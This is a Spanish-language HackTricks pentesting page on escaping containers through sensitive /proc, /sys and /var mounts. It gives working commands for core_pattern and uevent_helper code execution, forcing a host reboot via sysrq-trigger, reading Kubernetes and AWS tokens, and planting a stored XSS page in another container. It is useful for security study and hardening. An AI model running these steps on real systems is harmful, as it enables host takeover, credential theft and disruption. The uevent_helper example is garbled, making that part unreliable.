# Sensitive Mounts

{{#include ../../../../banners/hacktricks-training.md}}

La exposición de `/proc`, `/sys` y `/var` sin un aislamiento adecuado de namespaces introduce riesgos de seguridad significativos, incluyendo la ampliación de la superficie de ataque y la divulgación de información. Estos directorios contienen archivos sensibles que, si están mal configurados o son accedidos por un usuario no autorizado, pueden llevar a la fuga de contenedores, modificación del host o proporcionar información que ayude a ataques posteriores. Por ejemplo, montar incorrectamente `-v /proc:/host/proc` puede eludir la protección de AppArmor debido a su naturaleza basada en rutas, dejando `/host/proc` desprotegido.

**Puedes encontrar más detalles de cada posible vulnerabilidad en** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## Vulnerabilidades de procfs

### `/proc/sys`

Este directorio permite el acceso para modificar variables del kernel, generalmente a través de `sysctl(2)`, y contiene varios subdirectorios de interés:

#### **`/proc/sys/kernel/core_pattern`**

- Descrito en [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Permite definir un programa para ejecutar en la generación de archivos de núcleo con los primeros 128 bytes como argumentos. Esto puede llevar a la ejecución de código si el archivo comienza con un pipe `|`.
- **Ejemplo de Prueba y Explotación**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Probar acceso de escritura
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Establecer controlador personalizado
sleep 5 && ./crash & # Activar controlador
```

#### **`/proc/sys/kernel/modprobe`**

- Detallado en [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Contiene la ruta al cargador de módulos del kernel, invocado para cargar módulos del kernel.
- **Ejemplo de Comprobación de Acceso**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Comprobar acceso a modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- Referenciado en [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Una bandera global que controla si el kernel se bloquea o invoca al OOM killer cuando ocurre una condición OOM.

#### **`/proc/sys/fs`**

- Según [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contiene opciones e información sobre el sistema de archivos.
- El acceso de escritura puede habilitar varios ataques de denegación de servicio contra el host.

#### **`/proc/sys/fs/binfmt_misc`**

- Permite registrar intérpretes para formatos binarios no nativos basados en su número mágico.
- Puede llevar a la escalada de privilegios o acceso a shell root si `/proc/sys/fs/binfmt_misc/register` es escribible.
- Exploit relevante y explicación:
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- Tutorial en profundidad: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Otros en `/proc`

#### **`/proc/config.gz`**

- Puede revelar la configuración del kernel si `CONFIG_IKCONFIG_PROC` está habilitado.
- Útil para los atacantes para identificar vulnerabilidades en el kernel en ejecución.

#### **`/proc/sysrq-trigger`**

- Permite invocar comandos Sysrq, potencialmente causando reinicios inmediatos del sistema u otras acciones críticas.
- **Ejemplo de Reinicio del Host**:

```bash
echo b > /proc/sysrq-trigger # Reinicia el host
```

#### **`/proc/kmsg`**

- Expone mensajes del búfer de anillo del kernel.
- Puede ayudar en exploits del kernel, fugas de direcciones y proporcionar información sensible del sistema.

#### **`/proc/kallsyms`**

- Lista símbolos exportados del kernel y sus direcciones.
- Esencial para el desarrollo de exploits del kernel, especialmente para superar KASLR.
- La información de direcciones está restringida con `kptr_restrict` configurado en `1` o `2`.
- Detalles en [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Interactúa con el dispositivo de memoria del kernel `/dev/mem`.
- Históricamente vulnerable a ataques de escalada de privilegios.
- Más sobre [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Representa la memoria física del sistema en formato ELF core.
- La lectura puede filtrar el contenido de la memoria del sistema host y otros contenedores.
- El gran tamaño del archivo puede llevar a problemas de lectura o fallos de software.
- Uso detallado en [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Interfaz alternativa para `/dev/kmem`, representando la memoria virtual del kernel.
- Permite la lectura y escritura, por lo que la modificación directa de la memoria del kernel.

#### **`/proc/mem`**

- Interfaz alternativa para `/dev/mem`, representando la memoria física.
- Permite la lectura y escritura, la modificación de toda la memoria requiere resolver direcciones virtuales a físicas.

#### **`/proc/sched_debug`**

- Devuelve información de programación de procesos, eludiendo las protecciones del namespace PID.
- Expone nombres de procesos, IDs e identificadores de cgroup.

#### **`/proc/[pid]/mountinfo`**

- Proporciona información sobre los puntos de montaje en el namespace de montaje del proceso.
- Expone la ubicación del `rootfs` o imagen del contenedor.

### Vulnerabilidades de `/sys`

#### **`/sys/kernel/uevent_helper`**

- Usado para manejar `uevents` de dispositivos del kernel.
- Escribir en `/sys/kernel/uevent_helper` puede ejecutar scripts arbitrarios al activarse `uevent`.
- **Ejemplo de Explotación**: %%%bash

#### Crea una carga útil

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Encuentra la ruta del host desde el montaje de OverlayFS para el contenedor

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Establece uevent_helper en el ayudante malicioso

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Activa un uevent

echo change > /sys/class/mem/null/uevent

#### Lee la salida

cat /output %%%

#### **`/sys/class/thermal`**

- Controla configuraciones de temperatura, potencialmente causando ataques DoS o daños físicos.

#### **`/sys/kernel/vmcoreinfo`**

- Filtra direcciones del kernel, comprometiendo potencialmente KASLR.

#### **`/sys/kernel/security`**

- Alberga la interfaz `securityfs`, permitiendo la configuración de Módulos de Seguridad de Linux como AppArmor.
- El acceso podría permitir a un contenedor deshabilitar su sistema MAC.

#### **`/sys/firmware/efi/vars` y `/sys/firmware/efi/efivars`**

- Expone interfaces para interactuar con variables EFI en NVRAM.
- La mala configuración o explotación puede llevar a laptops bloqueadas o máquinas host que no se pueden iniciar.

#### **`/sys/kernel/debug`**

- `debugfs` ofrece una interfaz de depuración "sin reglas" al kernel.
- Historial de problemas de seguridad debido a su naturaleza sin restricciones.

### Vulnerabilidades de `/var`

La carpeta **/var** del host contiene sockets de tiempo de ejecución de contenedores y los sistemas de archivos de los contenedores. Si esta carpeta se monta dentro de un contenedor, ese contenedor obtendrá acceso de lectura y escritura a los sistemas de archivos de otros contenedores con privilegios de root. Esto puede ser abusado para pivotar entre contenedores, causar una denegación de servicio o crear puertas traseras en otros contenedores y aplicaciones que se ejecutan en ellos.

#### Kubernetes

Si un contenedor como este se despliega con Kubernetes:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: pod-mounts-var
labels:
app: pentest
spec:
containers:
- name: pod-mounts-var-folder
image: alpine
volumeMounts:
- mountPath: /host-var
name: noderoot
command: [ "/bin/sh", "-c", "--" ]
args: [ "while true; do sleep 30; done;" ]
volumes:
- name: noderoot
hostPath:
path: /var
```
Dentro del contenedor **pod-mounts-var-folder**:
```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
are/nginx/html/index2.html
```
El XSS se logró:

![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)

Tenga en cuenta que el contenedor NO requiere un reinicio ni nada. Cualquier cambio realizado a través de la carpeta montada **/var** se aplicará instantáneamente.

También puede reemplazar archivos de configuración, binarios, servicios, archivos de aplicación y perfiles de shell para lograr RCE automático (o semi-automático).

##### Acceso a credenciales de la nube

El contenedor puede leer tokens de serviceaccount de K8s o tokens de webidentity de AWS, lo que permite al contenedor obtener acceso no autorizado a K8s o a la nube:
```bash
/ # cat /host-var/run/secrets/kubernetes.io/serviceaccount/token
/ # cat /host-var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
#### Docker

La explotación en Docker (o en implementaciones de Docker Compose) es exactamente la misma, excepto que generalmente los sistemas de archivos de los otros contenedores están disponibles bajo una ruta base diferente:
```bash
$ docker info | grep -i 'docker root\|storage driver'
Storage Driver: overlay2
Docker Root Dir: /var/lib/docker
```
Los sistemas de archivos están bajo `/var/lib/docker/overlay2/`:
```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
<SNIP>
```
#### Nota

Las rutas reales pueden diferir en diferentes configuraciones, por lo que tu mejor opción es usar el comando **find** para localizar los sistemas de archivos de los otros contenedores.

### Referencias

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
